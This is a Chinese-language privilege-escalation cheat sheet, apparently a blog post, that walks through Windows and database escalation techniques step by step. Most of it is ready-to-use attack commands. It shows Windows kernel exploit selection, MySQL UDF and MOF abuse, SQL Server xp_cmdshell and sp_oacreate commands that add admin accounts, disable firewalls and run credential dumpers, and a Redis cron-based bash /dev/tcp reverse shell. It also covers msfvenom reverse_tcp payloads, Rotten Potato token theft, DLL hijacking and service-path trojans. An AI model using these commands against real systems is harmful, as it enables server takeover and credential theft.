@@ -1,0 +1,834 @@
+​ **目录**
+
+一、Windows内核溢出漏洞&AT&SC&PS提权
+
+1.基于WEB环境下的权限提升
+
+windows内核溢出漏洞提权
+
+2.基于本地环境下的权限提升-AT&SC&PS命令
+
+AT
+
+SC
+
+PS
+
+二、数据库提权
+
+1.Mysql
+
+udf提权
+
+MOF提权
+
+2.SQL Server
+
+xp_cmdshell提权
+
+xp_oacreate+sp_oamethod提权
+
+sandbox沙盒提权
+
+3.Oracle提权
+
+三、Redis&Postgre&令牌窃取&进程注入
+
+1.Redis
+
+利用计划任务反弹shell
+
+2.PostgreSQL
+
+3.令牌窃取
+
+4.Windows2003&10进程注入提升
+
+四、权限提升-烂土豆&dll劫持&引号路径&服务权限
+
+1.烂土豆
+
+案例：win7-烂土豆配合令牌窃取
+
+2.DLL劫持
+
+Win2012-DLL劫持提权应用配合MSF-Web权限
+
+3.可信任服务路径(引号路径)
+
+4.不安全的服务权限
+
+# 一、Windows内核溢出漏洞&AT&SC&PS提权
+
+### 1.基于WEB环境下的权限提升
+
+### windows内核溢出漏洞提权
+
+systeminfo > xx.txt 获得补丁信息
+
+使用 "Wes"进行补丁筛选：执行python.exe wes.py systeminfo.txt -o
+vuln.csv”；即对比“systeminfo”文件并将结果输出，其中“-o”是输出，可以将结果输出为“csv”“txt”等格式。输出的结果是可能存在的漏洞
+
+寻找并运行漏洞Exp进行权限提升/或者使用msf进行权限提升
+
+## 2.基于本地环境下的权限提升-AT&SC&PS命令
+
+前提是已经获取到普通用户权限，而且只适用于较老的计算机系统，本次那win2003为例
+
+### AT
+
+ **适用环境** ： **win2000 &win2003&winxp等win7之前的系统**
+
+at命令安排在特定日期和时间运行命令和程序，类似与一个计划任务
+
+通过cmd命令行运行 “at 15:13 /interactive cmd.exe”，发现打开的窗口是system权限
+
+这是一个逻辑错误
+
+![](https://image.3001.net/images/20221121/1669016893_637b2d3d10dd6c3eada68.png!small)​编辑
+
+### SC
+
+ **适用环境** ： **windows7/8 、2003/2007/2008、2012/2016**
+
+    
+    
+    sc Create systemcmd binPath= "cmd /K start" type= own type= interact
+    #其中systemcmd是服务名称，大家可以随意填写，binpath是启动的命令，type=own是指服务这个服务属于谁，type=interact。
+    #这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口。
+    
+    sc start systemcmd #启动服务！
+    
+
+解析：
+
+  1. 第一条 这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务
+
+Sc create 命令可具体查询
+
+BinPath是启动的命令
+
+Cmd /k string是执行string命令并继续保持窗口和环境变量，但不会继续向后执行
+
+Start 命令在没有参数的情况下会打开第二个命令行窗口，所以cmd /k start就是打开新命令行
+
+  * 2.第二条"sc start servicename" 开启服务
+  * ### PS
+
+  *  **适用环境：win2012-win7**
+  * PsTools是微软官方的工具包，工具包中的PsExec是一个轻量级的远程命令行工具
+  *   
+
+    
+        psexec.exe -accepteula -s  cmd.exe 
+
+![](https://image.3001.net/images/20221121/1669016893_637b2d3db4fe41811d8be.png!small)​编辑
+
+  * 参数解释：
+
+  * -accetpeula 禁止弹出对话框
+
+  * -s 以系统账户(system)运行
+
+  * 注：具体的psexec参数可在[PsExec - Windows Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec "PsExec - Windows Sysinternals | Microsoft Learn")查询
+
+  * 如果建立的IPC$不需要账号密码参数
+
+  * 未建立IPC$情况如下：
+
+  
+
+    
+        .\PsExec.exe -accepteula \\10.1.1.2 -u administrator -p 123.com -s cmd.exe
+    # 未建立IPC$的情况
+
+使用前提：
+
+开启admin共享(默认开启)（关闭的话会提示找不到网络名）
+
+对方未开启防火墙
+
+若是工作组环境必须要administrator用户(其他会提示拒绝访问)
+
+若是域环境，普通域用户/域管理员都可。普通域->普通域主机，域控->管理员账户
+
+# 二、数据库提权
+
+### 1.Mysql
+
+授权允许root外连
+
+    
+    
+    #授权允许外连
+    grant all privileges on *.* to 'root'@'%' identified by '密码';
+    #刷新授权
+    flush privileges;
+    #关闭授权
+    revoke all on *.* from dba@localhost;
+
+### udf提权
+
+密码查询：
+
+> #Mysql ≤ 5.6 版本
+>
+>  
+>
+>  
+>  
+>     select user,password from mysql.user where user=’root’;
+>
+> #Mysql ≥ 5.7 版本
+>
+>  
+>
+>  
+>  
+>     select host,user,authentication_string from mysql.user
+>
+> 或者通过查看数据库的user.MYD文件，里面存的是用户的密码的hash值，获取了以后可以通过cmd5或者其他途径进行查找
+>
+>
+> ![](https://image.3001.net/images/20221121/1669016894_637b2d3e7dc5c4b335569.png!small)​编辑
+
+  
+
+    
+    
+    #查询mysql的安装目录
+    select @@basedir;
+    #查询mysql的plugin目录，导入udf.dll到该目录
+    show variables like ‘%plugin%’;
+    #查看是否一样有文件上传的权限
+    show global variables like ‘secure%’;当secure_file_priv没有具体值时，导入导出没有限制，可提权
+    
+    #创建表
+    create table udf_data(datas LONGBLOB);
+    #插入udf的十六进制
+    insert into udf_data(datas) value(@udfs);
+    #讲udf的十六进制导出到Mysql的plugin目录(也可通过大马导入udf.dll)
+    select datas from udf_data into dumpfile ‘C:\\phpstudy\\Mysql\\lib\\plugin\\udf.dll’;
+    
+    #使用udf.dll创建sys_eval函数来执行系统命令(这个udf不能创建cmdshell)
+    create function sys_eval returns string soname ‘udf.dll’;
+    
+    #添加账户
+    select sys_eval(‘net user margin margin  /add’);
+    select sys_eva(‘net localgroup administrators margin /add’);
+    #清理表和函数
+    drop table udf_data;
+    drop function sys_eval;
+    
+    
+    udf提权
+    udf(user defined function) 是“用户自定义函数“的意思，通过添加新的函数拓展Mysql的功能
+    版本区别：
+    mysql < 5.1  导出目录C://windows或者system32
+    mysql => 5.1  导出 安装目录/lib/plugin  (plugin默认不存在，需要创建)
+    
+    
+
+如果我们的webshell权限很低或者只有Mysql弱口令，可以用NTFS流创建目录
+
+    
+    
+    select ‘xxx’  into outfile ‘安装目录\\lib\\plugin::$INDEX_ALLOCATIONS’;
+
+### MOF提权
+
+mof提权的成功率比较低
+
+总的过程就是上传自定义的mof文件到系统目录加载
+
+> 原理：
+>
+> 利用了 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof
+> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行，以系统权限执行。
+>
+> 条件：
+>
+>   1. windows 03及以下版本
+>   2. mysql启动身份具有权限去读写 c:/windows/system32/wbem/mof目录
+>   3. secure-file-priv参数不为null
+>   4. 在之前必须没有admin用户才能成功
+>
+
+>
+>  
+>
+>
+> 相关博客：https://www.cnblogs.com/xishaonian/p/6384535.html
+>
+>  
+>
+>  
+>  
+>     select load_file('C:/phpStudy/PHPTutorial/WWW/user_add.mof') into
+> dumpfile
+>      'c:/windows/system32/wbem/mof/nullevt.mof';
+>
+> **启动项知识点** ：（基于配合操作系统自启动）
+>
+> 导出自定义可执行文件到启动目录配合重启执行
+>
+> 将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！
+>
+>  **反弹知识点** ：（基于利用反弹特性命令执行）
+>
+> nc -l -p 5577
+
+## 2.SQL Server
+
+### xp_cmdshell提权
+
+前提：sa权限账户密码、sqlserver服务未降权
+
+xp_cmdshell默认再SQL Server2000中是开启的；但在SQL Server2005之后的版本是默认关闭的
+
+如果用户拥有管理员sa权限可以通过sp_configure重新开启xp_cmdshell
+
+    
+    
+    master数据库控制sql server数据库的所有方面。这个数据库包含了所有的配置信息，用户登录信息，等等
+    开启
+    USE master；
+    RECONFIGURE；
+    EXEC sp_configure 'show advanced options',1   #启用xp_cmdshell  
+    RECONFIGURE
+    EXEC sp_configure 'xp_cmdshell',1   #打开xp_cmdshell,可以调用SQL系统之外的命令  
+    RECONFIGURE
+    
+    关闭
+    
+    USE master
+    RECONFIGURE
+    EXEC sp_configure 'xp_cmdshell',0   
+    RECONFIGURE
+    EXEC sp_configure 'show advanced options',0
+    
+    执行
+    如果没有use master，那么执行
+      EXEC master.dbo.xp_cmdshell '命令' 
+    如果xp_cmdshell被删除，可以使用以下命令重新加载。
+      dbcc addextendedproc("xp_cmdshell","xplog70.dll");
+    如果连xplog70.dll文件都被被删除，可以上传xplog70.dll进行恢复
+      exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL  
+      Server\MSSQL\Binn\xplog70.dll';
+    
+    1.添加管理账户后开启远程桌面
+    
+    建立系统用户
+    exec xp_cmdshell 'net user pte77 test666 /add'
+    加入到管理员组
+    exec xp_cmdshell 'net localgroup administrators pte77 /add'
+    执行脚本
+    exec xp_cmdshell 'cmd.exe /C D:\web\3389.bat'
+    
+    exec xp_cmdshell 'netstat -anop tcp | find "3389"'
+    
+    exec xp_cmdshell 'netsh firewall set opmode disable' 关闭防火墙
+    
+    
+    
+    方法2 如果写不了用户 那就读账号密码
+    exec xp_cmdshell 'd:\oa\GetPass.exe'
+    
+    端口转发：
+    exec xp_cmdshell 'd:\web\lcx.exe -slave 攻击机ip 2222 127.0.0.1 3389'
+    
+    上传木马 --》上传 GetPass.exe或者 mimiter
+    exec xp_cmdshell 'd:\web\Getpass.exe'
+    
+
+### **xp_oacreate+sp_oamethod提权**
+
+使用sp_oacreate提权的原因，主要是用来调用OLE对象的run方法执行系统命令
+
+    
+    
+    开启
+    --sp_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回0，失败返回1
+    exec sp_configure 'show advanced options', 1;
+    reconfigure (with override);
+    exec sp_configure 'Ole Automation Procedures',1;
+    reconfigure (with override);
+    
+    --使用sp_oacreate调用wscript.shell组件，将返回的对象存储到@shell变量中。
+    declare @shell int;
+    exec sp_oacreate 'wscript.shell',@shell output;
+    --使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令，null是run方法的返回值，我们不需要用返回值，所以写null.
+    exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user oakley 123456 /add'
+    exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators oakley /add'
+    
+    关闭
+    --恢复语句EXEC
+    exec sp_configure 'Ole Automation Procedures', 0;
+    RECONFIGURE;
+    exec sp_configure 'show advanced options', 0;
+    RECONFIGURE;
+    
+
+sp_oamethod其他方法
+
+    
+    
+    复制文件
+    declare @o int;
+    exec sp_oacreate 'scripting.filesystemobject', @o out;
+    exec sp_oamethod @o, 'copyfile',null,'c:\\1.txt' ,'c:\\2.txt'
+    
+    移动文件
+    declare @o int;
+    exec sp_oacreate 'scripting.filesystemobject', @o out;
+    exec sp_oamethod @o, 'movefile',null,'c:\\1.txt' ,'c:\\2.txt'
+    
+    删除文件
+    DECLARE @Result int;
+    DECLARE @FSO_Token int;
+    EXEC @Result = sp_OACreate 'Scripting.FileSystemObject', @FSO_Token OUTPUT;
+    EXEC @Result = sp_OAMethod @FSO_Token, 'DeleteFile', NULL, 'C:\\Inetpub\\wwwroot\\1.txt';
+    EXEC @Result = sp_OADestroy @FSO_Token;
+    
+
+### sandbox沙盒提权
+
+sandboxmode是一种安全功能。沙盒模式下，准许mdb文件执行数据库，通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令。
+
+    
+    
+    #开启沙盒
+    exec sp_configure 'show advanced options',1;
+    reconfigure;
+    exec sp_configure 'Ad Hoc Distributed Queries',1; #不开启的话执行xp_regwrite会让我们开启
+    reconfigure;
+    
+    #关闭沙盒
+    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
+    
+    沙盒模式`SandBoxMode`参数含义（默认是2）
+    0：在任何所有者中禁止启用安全模式
+    1 ：为仅在允许范围内
+    2 ：必须在access模式下
+    3：完全开启
+    
+    #查询是否正常关闭，经测试，沙盒模式开关与否都不会影响下面的语句
+    #exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode';
+    
+    #执行系统命令
+    select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("想要执行的命令")') 
+    
+    
+    #恢复配置
+    –exec master…xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
+    –exec sp_configure 'Ad Hoc Distributed Queries',0;
+    reconfigure;
+    –exec sp_configure 'show advanced options',0;
+    reconfigure;
+
+涉及资源：
+
+  1. mof提权原理及其过程：https://www.cnblogs.com/xishaonian/p/6384535.html
+  2. SQL Server提权方法汇总（MSSQL）：https://blog.51cto.com/11797152/2411770
+
+以上三种数据库提权方式都适用于sql server 2008及之前的版本，2012及之后的版本尚未测试
+
+### 3.Oracle提权
+
+oracle数据库一般配合jsp建站，jsp网站后门无需提权，自带system。
+
+[自动化工具oracleshells](https://github.com/jas502n/oracleShell
+"自动化工具oracleshells")
+
+# 三、Redis&Postgre&令牌窃取&进程注入
+
+### 1.Redis
+
+redis未授权：redis默认会绑定0.0.0.0:6379，若未采取相关策略，redis服务暴露在公网，若未设置密码，会导致任意用户未授权访问
+
+漏洞产生条件：
+
+> （1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；
+>
+> （2）没有设置密码认证（默认为空），可以免密码远程登录redis服务。
+>
+> （3）如果想高级利用，对方是以root身份启动的redis
+
+### 利用计划任务反弹shell
+
+> 在redis以root权限运行时可以写crontab来执行命令反弹shell,其中可以写入cron的地方有：
+
+/etc/crontab这个是肯定的
+
+  * /etc/cron.d/*将任意文件写到该目录下,效果和crontab相同,格式也要和/etc/crontab相同.漏洞利用这个目录,可以做到不覆盖任何其他文件的情况进 行反弹shell
+
+  * /var/spool/cron/rootcentos系统下root用户的cron文件
+
+  * /var/spool/cron/c
+
+  * rontabs/rootdebia
+
+> n系统下root用户的cron文件
+
+关于linux的知识点：
+
+> eg：bash -i >& /dev/tcp/监听IP地址/端口号 0>&1
+>
+> 0，标准输入(一般是键盘)
+>
+> 1，标准输出(用户终端控制台)
+>
+> 2，标准错误(出错信息输出)
+>
+> 重定向：
+>
+> command &> file 或者command >& file
+>
+> 将command命令的标准输出和标准错误都重定向到file/dev/tcp
+>
+> linux有个特殊文件。以任何方式打开的/dev/tcp/HOST/PORT 都将以HOST/PORT 方式
+>
+> 发送tcp连接请求
+>
+> bash -i 开启一个交互式的shell
+>
+> >& 将标准输出和标准错误吃重定向到/dev/tcp/HOSTPORT。
+>
+> 0>&1 将标准输入的读取对象设置为标准输出大的输出对象，即将标准输出也重定向到
+>
+> /dev/tcp/HOST/PORT。
+>
+> 总体效果就是所有的输入和输出都来自网络的另一端。
+>
+> 更多bash参数内容man bash查看
+
+连接redis：
+
+> redis-cli -h IP(若是本地数据库填127.0.0.1)
+
+提权命令：
+
+> #此处如果知道绝对目录可以写入webshell
+>
+> set x "\n ***** bash -i >& /dev/tcp/监听IP地址/端口号 0>&1 \n"
+>
+> #设置备份目录
+>
+> config set dir /var/spool/cron
+>
+> #设置备份文件名
+>
+> config set dbfilename root
+>
+> #保存
+>
+> save
+
+Redis未授权访问漏洞总结：https://blog.csdn.net/fly_hps/article/details/80937837
+
+## 2.PostgreSQL
+
+PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPYTO/FROM
+PROGRAM”权限的用户，可以使用这个特性执行任意命令。
+
+> 提权利用的是漏洞：CVE-2019-9193、CVE-2018-1058
+>
+> 提权方法：
+>
+> 连接-利用漏洞-执行-提权
+>
+> 参考：https://vulhub.org/#/environments/postgres/
+>
+> 修复方案：升级版本或打上补丁
+>
+> 高权限账户
+>
+> MySQL：root
+>
+> MsSQL：sa
+>
+> Oracle：DBA
+
+## 3.令牌窃取
+
+进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。
+
+本地提权实验：获取会话-利用模块-窃取令牌-提权
+
+令牌窃取是建立在已经反弹shell的基础上，使用的是msf工具
+
+适应系统：
+
+> Microsoft Windows XP Professional SP3和之前版本
+>
+> Windows Server 2003 SP2和之前的版本
+>
+> Windows Server 2003 x64和x64 SP2
+>
+> Windows Server 2003（用于基于Itanium的系统SP2和先前版本）
+>
+> Windows Server 2008 x32 x64
+>
+> Windows Server 2008（用于基于Itanium的系统）
+>
+> Windows Vista SP1和之前的版本
+>
+> Windows Vista x64 SP1和之前的版本
+>
+> 只适用于2008之前的老版本
+
+提权命令：
+
+> use incognito
+>
+> list_tokens -u
+>
+> impersonate_token "令牌名"
+
+## 4.Windows2003&10进程注入提升
+
+进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。
+
+> pinjector进程注入工具针对-win2008以前操作系统
+>
+> 在cmd中运行该软件
+>
+> 加“-l”获取当前计算机的进程列表
+>
+> 加“-p 被注入的进程pid cmd.exe（反弹过去的程序） 反弹的端口号”
+>
+> 用nc连接
+
+# 四、权限提升-烂土豆&dll劫持&引号路径&服务权限
+
+> #生成shell
+>
+> msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.202.128 lport=5577
+> -f exe > shell.exe
+>
+> #使用监听模块
+>
+> use exploit/multi/handler
+>
+> #设置payload（这是windows的）
+>
+> set payload windows/meterpreter/reverse_tcp
+>
+> set lhost xxx
+>
+> set lport xxx
+>
+> exploit
+
+### 1.烂土豆
+
+> exp下载：
+>
+> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
+>
+>
+> https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe  
+> https://github.com/foxglovesec/RottenPotato
+
+提权原理：
+
+> 1、欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。
+>
+> 2、对这个认证过程使用中间人攻击（NTLM重放），为“NT
+> AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。
+>
+>
+> 3、模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。
+>
+>
+> 所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。
+
+优点：
+
+> 1.100%可靠
+>
+> 2.（当时）全版本通杀
+>
+> 3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用
+>
+>
+> 总之，烂土豆是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。
+
+注意事项：
+
+>  **一般烂土豆要msf的令牌窃取进行提权**
+>
+>  **注：（烂土豆配合本地提权是无法成功的，只有配合web或者数据库等权限）**
+>
+>  **1.单纯的令牌窃取：web权限或者本地提权**
+>
+>  **2.配合烂土豆提权：web权限或者数据库等权限**
+
+### 案例：win7-烂土豆配合令牌窃取
+
+过程：上传烂土豆 -> 执行烂土豆 -> 利用窃取模块 -> 窃取SYSTEM
+
+通过webshell手动上传或者msf上传都可以
+
+这里用msf：
+
+> 上传烂土豆文件 ： upload /root/potato.exe C:\Users\Public
+>
+> 切换到对应文件夹执行烂土豆：execute -cH -f ./potate.exe
+>
+> 利用令牌窃取模块：
+>
+> use incognito
+>
+> list_tokens -u
+>
+> impersonate_token "NT AUTHORITY\\\SYSTEM"
+
+### 2.DLL劫持
+
+### Win2012-DLL劫持提权应用配合MSF-Web权限
+
+ **原理**
+
+dll劫持提权需要特定软件应用的控制权限及启用配合
+
+>
+> 原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下
+>
+> 面的顺序进行搜索：
+>
+> 1、应用程序加载的目录
+>
+> 2、C:\Windows\System32
+>
+> 3、C:\Windows\System
+>
+> 4、C:\Windows
+>
+> 5、当前工作目录Current Working Directory，CWD
+>
+> 6、在PATH环境变量的目录（先系统后用户）
+
+ **过程** ：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功
+
+ **实操**
+
+> 1.信息收集：找到服务器上常用的第三方软件，这里是flashfxp
+>
+> 2.进程调试：分析程序运行时会调用哪些dll，使用火绒剑进行进程分析。打开被分析的软件
+>
+> 后通过“进程”栏目找到对应软件，再找到其中合适的进程。合适的进程要不是系
+>
+> 统文件，也 不再高权限的目录中，最好来自自身的文件。
+>
+> 3.制作dll并上传：自己开发或使用msf
+>
+> msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP] lport=[port] -f dll
+> >/opt/xiaodi.dll
+>
+> 换dl：通过webshell替换
+>
+> 启动应用后成功，通过令牌窃取等方式获得更多权限
+
+### 3.可信任服务路径(引号路径)
+
+ **原理** ：
+
+> 对于C:\Program Files\Some
+> Folder\Service.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。
+>
+> 以上面的例子为例，windows会依次尝试确定和执行下面的程序：
+>
+> C:\Program.exe
+>
+> C:\Program Files\Some.exe
+>
+> C:\Program Files\Some Folder\Service.exe
+>
+>
+> 所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:\Program
+> Files\Some Folder\Service.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。
+
+ **过程** ：检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功
+
+ **win2012-不带引号路径配合msf**
+
+> 1.检测引号服务路径：使用webshell或本地权限执行命令，会自动返回调用执行程序时没用
+>
+> 引号的，需要在其中找出路径中有空格的
+>
+>  
+>
+>  
+>  
+>     wmic service get name,displayname,pathname,startmode |findstr
+>     /i "Auto" |findstr /i /v "C:\Windows\\"|findstr /i /v """
+>  
+>  
+>
+> 这里找到“c:\program files (x86)\”下的一个程序文件
+>
+> 2.利用路径制作文件并上传：根据路径制作后门文件“\program.exe”，如果有多个空格，可以
+>
+> 放在任意空格处
+>
+> 3.启用服务或重启：手动或借助webshell启动服务，不过webshell一般没有启动权限
+>
+> sc start “[服务名]”
+>
+> 调用后成功
+
+### 4.不安全的服务权限
+
+环境：win2012
+
+ **原理：**
+
+> 即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件
+
+ **过程：** 检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功
+
+ **工具：** AccessChk：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
+
+ **实操：**
+
+> 1.在被攻击机上安装AccessChk
+>
+> 2.查看指定目录的权限配置情况
+>
+>  
+>
+>
+>  
+>
+>  
+>  
+>     检测服务权限配置：执行命令检测，检测当前用户可以操作的服务项
+>     accesschk.exe -uwcqv "[你可以操作的用户组]" * /accepteula
+>     返回的是当前组可以操作的服务，没有则失败
+>
+> 3.检查服务 如果是.SERVICE_ALL_ACCESS的意思是我们对“Vulnerable Service”的属性拥有完全控制权
+>
+>  
+>
+>
+>
+> ![](https://image.3001.net/images/20221121/1669016895_637b2d3f6d0c62c3836e8.png!small)​
+>
+> 编辑
+>
+>  
+>
+>
+> 4.制作文件并上传：上传木马文件
+>
+> 5.更改服务路径指向：将一个有权限操作的服务项的路径指向更改为木马
+>
+> sc config "[服务项名]" binpath="[木马文件和它的完整路径]"
+>
+> 调用后成功：注意调用的是服务项
+>
+> sc start "[服务名]"
+
+  
+
